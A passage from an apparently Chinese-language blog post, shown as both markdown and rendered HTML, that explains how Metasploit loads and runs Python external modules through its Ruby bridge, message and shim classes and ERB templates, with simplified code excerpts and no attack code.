     return m\n    end\n  end\n  \n  # 接收\n  def recv(filter_id=nil, timeout=600)\n    _, out, err = self.ios\n    message = ''\n  \n  # jsonrpc发送和接受\n  def send_receive(message)\n    send(message)\n    recv(message.id)\n  end\n  \n  # 发送模块元数据\n  def describe\n    resp = send_receive(Msf::Modules::External::Message.new(:describe))\n    close_ios\n    resp.params\n  end\n  \t\n  # 发送  \n  def send(message)\n    input, output, err, status = ::Open3.popen3(self.env, self.cmd)\n    self.ios = [input, output, err]\n    self.wait_thread = status\n    case select(nil, [input], nil, 0.1)\n    when nil\n      raise \"Cannot run module #{self.path}\"\n    when [[], [input], []]\n      m = message.to_json\n      write_message(input, m)\n    else\n      raise \"Error running module #{self.path}\"\n    end\n  end\n  \n  # TODO 这里原本有一大段关于网络接受的代码 \n\n# 每个编程语言扩展的具体实现\nclass Msf::Modules::External::PyBridge < Msf::Modules::External::Bridge\n # 判断是否是py文件\n  def self.applies?(module_name)\n    module_name.match? /\\.py$/\n  end\n \n  # 初始化 python扩展添加了额外的路径\n  def initialize(module_path)\n    super\n    pythonpath = ENV['PYTHONPATH'] || ''\n    self.env = self.env.merge({ 'PYTHONPATH' => pythonpath + File::PATH_SEPARATOR + File.expand_path('../python', __FILE__) })\n  end\nend\n\n\nclass Msf::Modules::External::Bridge\n  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?\n  LOADERS = [\n    Msf::Modules::External::PyBridge,\n    Msf::Modules::External::Bridge\n  ]\n\t\n  # 运行模块方法 让载入的bridge都判断是否是自己所属的 \n  def self.open(module_path)\n    LOADERS.each do |klass|\n      return klass.new module_path if klass.applies? module_path\n    end\n    nil\n  end\nend\n~~~\n\n\n这里是省略了不重要的细节的`shim.rb`代码\n~~~\nrequire 'msf/core/modules/external/bridge'\n\nclass Msf::Modules::External::Shim\n  # 将bridge返回的数据生成一个模块\n  def self.generate(module_path)\n    mod = Msf::Modules::External::Bridge.open(module_path)\n    return '' unless mod.meta\n    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 \n    case mod.meta['type']\n    when 'remote_exploit_cmd_stager'\n      remote_exploit_cmd_stager(mod)\n    when 'capture_server'\n      capture_server(mod)\n    when 'dos'\n      dos(mod)\n    when 'scanner.multi'\n      multi_scanner(mod)\n    else\n      # TODO have a nice load error show up in the logs\n      ''\n    end\n  end\n  \n  # 返回一个模块 erb是ruby的一个代码模板库\n  def self.render_template(name, meta = {})\n    template = File.join(File.dirname(__FILE__), 'templates', name)\n    ERB.new(File.read(template)).result(binding)\n  end\n\n  def self.common_metadata(meta = {})\n    render_template('common_metadata.erb', meta)\n  end\n  \n  # 数据转换\n  def self.mod_meta_common(mod, meta = {})\n    meta[:path]        = mod.path.dump\n    meta[:name]        = mod.meta['name'].dump\n    meta[:description] = mod.meta['description'].dump\n    meta[:authors]     = mod.meta['authors'].map(&:dump).join(\",\\n          \")\n\n    meta[:options]     = mod.meta['options'].map do |n, o|\n      \"Opt#{o['type'].camelize}.new(#{n.dump},\n        [#{o['required']}, #{o['description'].dump}, #{o['default'].inspect}])\"\n    end.join(\",\\n          \")\n    meta\n  end\n\n # 渲染膜拜\n  def self.dos(mod)\n    meta = mod_meta_common(mod)\n    meta[:date] = mod.meta['date'].dump\n    meta[:references] = mod.meta['references'].map do |r|\n      \"[#{r['type'].upcase.dump}, #{r['ref'].dump}]\"\n    end.join(\",\\n          \")\n    render_template('dos.erb', meta)\n  end\nend\n\n~~~\n\n所以python模块的运行过程其实是这样的\n1. class Msf::Modules::External::Shim获取到了模块路径\n2. 调用Msf::Modules::External::Bridge.open\n3.  在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)\n4.  初始化一个Msf::Modules::External::PyBridge并返回\n5.  判断元数据类型 假设是dos 则调用dos方法\n6.  调用mod_meta_common方法转换元数据 渲染代码模板\n\n我们可以查看`dos.erb`的内容\n~~~\nrequire 'msf/core/modules/external/bridge'\nrequire 'msf/core/module/external'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Module::External\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super({\n\t  <%= common_metadata meta %>\n      'References'  =>\n        [\n          <%= meta[:references] %>\n        ],\n      'DisclosureDate' => <%= meta[:date] %>,\n      })\n\n      register_options([\n        <%= meta[:options] %>\n      ])\n  end\n\n  def run\n    print_status(\"Starting server...\")\n    mod = Msf::Modules::External::Bridge.open(<%= meta[:path] %>)\n    mod.run(datastore)\n    wait_status(mod)\n  end\nend\n~~~\n所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在\n~~~\nmod = Msf::Modules::External::Bridge.open(<%= meta[:path] %>)\nmod.run(datastore)\n~~~\n最后通过`bridge.run`调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好\n","slug":"metasploit-python-模块是如何运行","published":1,"updated":"2018-05-31T01:34:08.831Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0wi0r0003r4nxg8rl2p4j","content":"<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>metasploit的扩展实现的代码主要在<code>metasploit-framework/lib/msf/core/modules/external</code><br>目录结构如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── bridge.rb</span><br><span class=\"line\">├── message.rb</span><br><span class=\"line\">├── python</span><br><span class=\"line\">│   ├── async_timeout</span><br><span class=\"line\">│   │   ├── __init__.py</span><br><span class=\"line\">│   └── metasploit</span><br><span class=\"line\">│       ├── __init__.py</span><br><span class=\"line\">│       ├── __init__.pyc</span><br><span class=\"line\">│       ├── module.py</span><br><span class=\"line\">│       ├── module.pyc</span><br><span class=\"line\">│       ├── probe_scanner.py</span><br><span class=\"line\">├── shim.rb</span><br><span class=\"line\">└── templates</span><br><span class=\"line\">    ├── capture_server.erb</span><br><span class=\"line\">    ├── common_metadata.erb</span><br><span class=\"line\">    ├── dos.erb</span><br><span class=\"line\">    ├── multi_scanner.erb</span><br><span class=\"line\">    └── remote_exploit_cmd_stager.erb</span><br></pre></td></tr></table></figure></p>\n<p>其中<code>python</code>目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入<code>metasploit</code><br><code>templates</code>目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如<code>info</code>都是靠这些模板实现的.<br><code>message.rb</code>和<code>bridge</code>是与msf jsonrpc通信的一些api.<br><code>shim.rb</code>则是真正将python代码实现为模块的代码.</p>\n<p>这里省略了不重要的细节的<code>message.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Msf::Modules::External::Message</span><br><span class=\"line\"> </span><br><span class=\"line\">  def self.from_module(j)                                                                                        </span><br><span class=\"line\">    if j[&apos;method&apos;]</span><br><span class=\"line\">      m = self.new(j[&apos;method&apos;].to_sym)</span><br><span class=\"line\">      m.params = j[&apos;params&apos;]</span><br><span class=\"line\">      m</span><br><span class=\"line\">    elsif j[&apos;response&apos;]</span><br><span class=\"line\">      m = self.new(:reply)</span><br><span class=\"line\">      m.params = j[&apos;response&apos;]</span><br><span class=\"line\">      m.id = j[&apos;id&apos;]</span><br><span class=\"line\">      m</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\"> </span><br><span class=\"line\">  def initialize(m)</span><br><span class=\"line\">    self.method = m</span><br><span class=\"line\">    self.params = &#123;&#125;</span><br><span class=\"line\">    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))</span><br><span class=\"line\">  end</span><br><span class=\"line\"> </span><br><span class=\"line\">  def to_json</span><br><span class=\"line\">    params =</span><br><span class=\"line\">      if self.params.respond_to? :to_nested_values</span><br><span class=\"line\">        self.params.to_nested_values</span><br><span class=\"line\">      else</span><br><span class=\"line\">        self.params.to_h</span><br><span class=\"line\">      end</span><br><span class=\"line\">    JSON.generate(&#123;jsonrpc: &apos;2.0&apos;, id: self.id, method: self.method, params: params&#125;)</span><br><span class=\"line\">  end</span><br></pre></td></tr></table></figure></p>\n<p>这个类实际上是对传递给metasploit的信息的一个封装.<br><code>initialize</code>是ruby的初始化方法 从这里可以看到它有三个属性<code>method</code> <code>params</code> <code>id</code> </p>\n<p><code>from_module</code>方法则是用于将传递的参数转换成自身<br><code>to_json</code>方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)</p>\n<p>这里是省略了不重要的细节的<code>bridge.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/message&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Bridge</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 通过jsonrpc运行</span><br><span class=\"line\">  def run(datastore)</span><br><span class=\"line\">    unless self.running</span><br><span class=\"line\">      m = Msf::Modules::External::Message.new(:run)</span><br><span class=\"line\">      m.params = datastore.dup</span><br><span class=\"line\">      send(m)</span><br><span class=\"line\">      self.running = true</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">\t</span><br><span class=\"line\">  # 获取当前状态和恢复run状态  </span><br><span class=\"line\">  def get_status</span><br><span class=\"line\">    if self.running || !self.messages.empty?</span><br><span class=\"line\">      m = receive_notification</span><br><span class=\"line\">      if m.nil?</span><br><span class=\"line\">        close_ios</span><br><span class=\"line\">        self.messages.close</span><br><span class=\"line\">        self.running = false</span><br><span class=\"line\">      end</span><br><span class=\"line\"></span><br><span class=\"line\">      return m</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 接收</span><br><span class=\"line\">  def recv(filter_id=nil, timeout=600)</span><br><span class=\"line\">    _, out, err = self.ios</span><br><span class=\"line\">    message = &apos;&apos;</span><br><span class=\"line\">  </span><br><span class=\"line\">  # jsonrpc发送和接受</span><br><span class=\"line\">  def send_receive(message)</span><br><span class=\"line\">    send(message)</span><br><span class=\"line\">    recv(message.id)</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 发送模块元数据</span><br><span class=\"line\">  def describe</span><br><span class=\"line\">    resp = send_receive(Msf::Modules::External::Message.new(:describe))</span><br><span class=\"line\">    close_ios</span><br><span class=\"line\">    resp.params</span><br><span class=\"line\">  end</span><br><span class=\"line\">  \t</span><br><span class=\"line\">  # 发送  </span><br><span class=\"line\">  def send(message)</span><br><span class=\"line\">    input, output, err, status = ::Open3.popen3(self.env, self.cmd)</span><br><span class=\"line\">    self.ios = [input, output, err]</span><br><span class=\"line\">    self.wait_thread = status</span><br><span class=\"line\">    case select(nil, [input], nil, 0.1)</span><br><span class=\"line\">    when nil</span><br><span class=\"line\">      raise &quot;Cannot run module #&#123;self.path&#125;&quot;</span><br><span class=\"line\">    when [[], [input], []]</span><br><span class=\"line\">      m = message.to_json</span><br><span class=\"line\">      write_message(input, m)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      raise &quot;Error running module #&#123;self.path&#125;&quot;</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # TODO 这里原本有一大段关于网络接受的代码 </span><br><span class=\"line\"></span><br><span class=\"line\"># 每个编程语言扩展的具体实现</span><br><span class=\"line\">class Msf::Modules::External::PyBridge &lt; Msf::Modules::External::Bridge</span><br><span class=\"line\"> # 判断是否是py文件</span><br><span class=\"line\">  def self.applies?(module_name)</span><br><span class=\"line\">    module_name.match? /\\.py$/</span><br><span class=\"line\">  end</span><br><span class=\"line\"> </span><br><span class=\"line\">  # 初始化 python扩展添加了额外的路径</span><br><span class=\"line\">  def initialize(module_path)</span><br><span class=\"line\">    super</span><br><span class=\"line\">    pythonpath = ENV[&apos;PYTHONPATH&apos;] || &apos;&apos;</span><br><span class=\"line\">    self.env = self.env.merge(&#123; &apos;PYTHONPATH&apos; =&gt; pythonpath + File::PATH_SEPARATOR + File.expand_path(&apos;../python&apos;, __FILE__) &#125;)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Bridge</span><br><span class=\"line\">  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?</span><br><span class=\"line\">  LOADERS = [</span><br><span class=\"line\">    Msf::Modules::External::PyBridge,</span><br><span class=\"line\">    Msf::Modules::External::Bridge</span><br><span class=\"line\">  ]</span><br><span class=\"line\">\t</span><br><span class=\"line\">  # 运行模块方法 让载入的bridge都判断是否是自己所属的 </span><br><span class=\"line\">  def self.open(module_path)</span><br><span class=\"line\">    LOADERS.each do |klass|</span><br><span class=\"line\">      return klass.new module_path if klass.applies? module_path</span><br><span class=\"line\">    end</span><br><span class=\"line\">    nil</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>这里是省略了不重要的细节的<code>shim.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class Msf::Modules::External::Shim</span><br><span class=\"line\">  # 将bridge返回的数据生成一个模块</span><br><span class=\"line\">  def self.generate(module_path)</span><br><span class=\"line\">    mod = Msf::Modules::External::Bridge.open(module_path)</span><br><span class=\"line\">    return &apos;&apos; unless mod.meta</span><br><span class=\"line\">    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 </span><br><span class=\"line\">    case mod.meta[&apos;type&apos;]</span><br><span class=\"line\">    when &apos;remote_exploit_cmd_stager&apos;</span><br><span class=\"line\">      remote_exploit_cmd_stager(mod)</span><br><span class=\"line\">    when &apos;capture_server&apos;</span><br><span class=\"line\">      capture_server(mod)</span><br><span class=\"line\">    when &apos;dos&apos;</span><br><span class=\"line\">      dos(mod)</span><br><span class=\"line\">    when &apos;scanner.multi&apos;</span><br><span class=\"line\">      multi_scanner(mod)</span><br><span class=\"line\">    else</span><br><span class=\"line\">      # TODO have a nice load error show up in the logs</span><br><span class=\"line\">      &apos;&apos;</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 返回一个模块 erb是ruby的一个代码模板库</span><br><span class=\"line\">  def self.render_template(name, meta = &#123;&#125;)</span><br><span class=\"line\">    template = File.join(File.dirname(__FILE__), &apos;templates&apos;, name)</span><br><span class=\"line\">    ERB.new(File.read(template)).result(binding)</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  def self.common_metadata(meta = &#123;&#125;)</span><br><span class=\"line\">    render_template(&apos;common_metadata.erb&apos;, meta)</span><br><span class=\"line\">  end</span><br><span class=\"line\">  </span><br><span class=\"line\">  # 数据转换</span><br><span class=\"line\">  def self.mod_meta_common(mod, meta = &#123;&#125;)</span><br><span class=\"line\">    meta[:path]        = mod.path.dump</span><br><span class=\"line\">    meta[:name]        = mod.meta[&apos;name&apos;].dump</span><br><span class=\"line\">    meta[:description] = mod.meta[&apos;description&apos;].dump</span><br><span class=\"line\">    meta[:authors]     = mod.meta[&apos;authors&apos;].map(&amp;:dump).join(&quot;,\\n          &quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    meta[:options]     = mod.meta[&apos;options&apos;].map do |n, o|</span><br><span class=\"line\">      &quot;Opt#&#123;o[&apos;type&apos;].camelize&#125;.new(#&#123;n.dump&#125;,</span><br><span class=\"line\">        [#&#123;o[&apos;required&apos;]&#125;, #&#123;o[&apos;description&apos;].dump&#125;, #&#123;o[&apos;default&apos;].inspect&#125;])&quot;</span><br><span class=\"line\">    end.join(&quot;,\\n          &quot;)</span><br><span class=\"line\">    meta</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\"> # 渲染膜拜</span><br><span class=\"line\">  def self.dos(mod)</span><br><span class=\"line\">    meta = mod_meta_common(mod)</span><br><span class=\"line\">    meta[:date] = mod.meta[&apos;date&apos;].dump</span><br><span class=\"line\">    meta[:references] = mod.meta[&apos;references&apos;].map do |r|</span><br><span class=\"line\">      &quot;[#&#123;r[&apos;type&apos;].upcase.dump&#125;, #&#123;r[&apos;ref&apos;].dump&#125;]&quot;</span><br><span class=\"line\">    end.join(&quot;,\\n          &quot;)</span><br><span class=\"line\">    render_template(&apos;dos.erb&apos;, meta)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>所以python模块的运行过程其实是这样的</p>\n<ol>\n<li>class Msf::Modules::External::Shim获取到了模块路径</li>\n<li>调用Msf::Modules::External::Bridge.open</li>\n<li>在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)</li>\n<li>初始化一个Msf::Modules::External::PyBridge并返回</li>\n<li>判断元数据类型 假设是dos 则调用dos方法</li>\n<li>调用mod_meta_common方法转换元数据 渲染代码模板</li>\n</ol>\n<p>我们可以查看<code>dos.erb</code>的内容<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class=\"line\">require &apos;msf/core/module/external&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class=\"line\">  include Msf::Module::External</span><br><span class=\"line\">  include Msf::Auxiliary::Dos</span><br><span class=\"line\"></span><br><span class=\"line\">  def initialize</span><br><span class=\"line\">    super(&#123;</span><br><span class=\"line\">\t  &lt;%= common_metadata meta %&gt;</span><br><span class=\"line\">      &apos;References&apos;  =&gt;</span><br><span class=\"line\">        [</span><br><span class=\"line\">          &lt;%= meta[:references] %&gt;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">      &apos;DisclosureDate&apos; =&gt; &lt;%= meta[:date] %&gt;,</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">      register_options([</span><br><span class=\"line\">        &lt;%= meta[:options] %&gt;</span><br><span class=\"line\">      ])</span><br><span class=\"line\">  end</span><br><span class=\"line\"></span><br><span class=\"line\">  def run</span><br><span class=\"line\">    print_status(&quot;Starting server...&quot;)</span><br><span class=\"line\">    mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class=\"line\">    mod.run(datastore)</span><br><span class=\"line\">    wait_status(mod)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br></pre></td></tr></table></figure></p>\n<p>所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class=\"line\">mod.run(datastore)</span><br></pre></td></tr></table></figure></p>\n<p>最后通过<code>bridge.run</code>调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>metasploit的扩展实现的代码主要在<code>metasploit-framework/lib/msf/core/modules/external</code><br>目录结构如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── bridge.rb</span><br><span class=\"line\">├── message.rb</span><br><span class=\"line\">├── python</span><br><span class=\"line\">│   ├── async_timeout</span><br><span class=\"line\">│   │   ├── __init__.py</span><br><span class=\"line\">│   └── metasploit</span><br><span class=\"line\">│       ├── __init__.py</span><br><span class=\"line\">│       ├── __init__.pyc</span><br><span class=\"line\">│       ├── module.py</span><br><span class=\"line\">│       ├── module.pyc</span><br><span class=\"line\">│       ├── probe_scanner.py</span><br><span class=\"line\">├── shim.rb</span><br><span class=\"line\">└── templates</span><br><span class=\"line\">    ├── capture_server.erb</span><br><span class=\"line\">    ├── common_metadata.erb</span><br><span class=\"line\">    ├── dos.erb</span><br><span class=\"line\">    ├── multi_scanner.erb</span><br><span class=\"line\">    └── remote_exploit_cmd_stager.erb</span><br></pre></td></tr></table></figure></p>\n<p>其中<code>python</code>目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入<code>metasploit</code><br><code>templates</code>目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如<code>info</code>都是靠这些模板实现的.<br><code>message.rb</code>和<code>bridge</code>是与msf jsonrpc通信的一些api.<br><code>shim.rb</code>则是真正将python代码实现为模块的代码.</p>\n<p>这里省略了不重要的细节的<code>message.rb</code>代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Msf::Modules::External::Message</span><br><span class=\"line\"> </span><br><span class=\"line\">  def self.from_module(j)                                                                                        </span><br><span class=\"line\">    if j[&apos;method&apos;]</span><br><span class=\"line\">      m = self.new(j[&apos;method&apos;].to_sym)</span><br><span class=\"line\">      m.params = j[&apos;params&apos;]</span><br><span class=\"line\">      m</span><br><span class=\"line\">    elsif j[&apos;response&apos;]</span><br><span class=\"line\">      m = self.new(:reply)</span><br><span class=\"line\">      m.params = j[&apos;response&apos;]</span><br><span class=\"line\">      m.id = j[&apos;id&apos;]</span><br><span class=\"line\">      m</span><br><span class=\"line\">    end</span><br><span class=\"line\">  end</span><br><span class=\"line\"> </span><br><span class=\"line\">  def initialize(m)</span><br><span class=\"line\">    self.method = m</span><br><span class=\"line\">    self.params = &#123;&#125;</span><br><span class=\"line\">    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))</span><br><span class=\"line\">  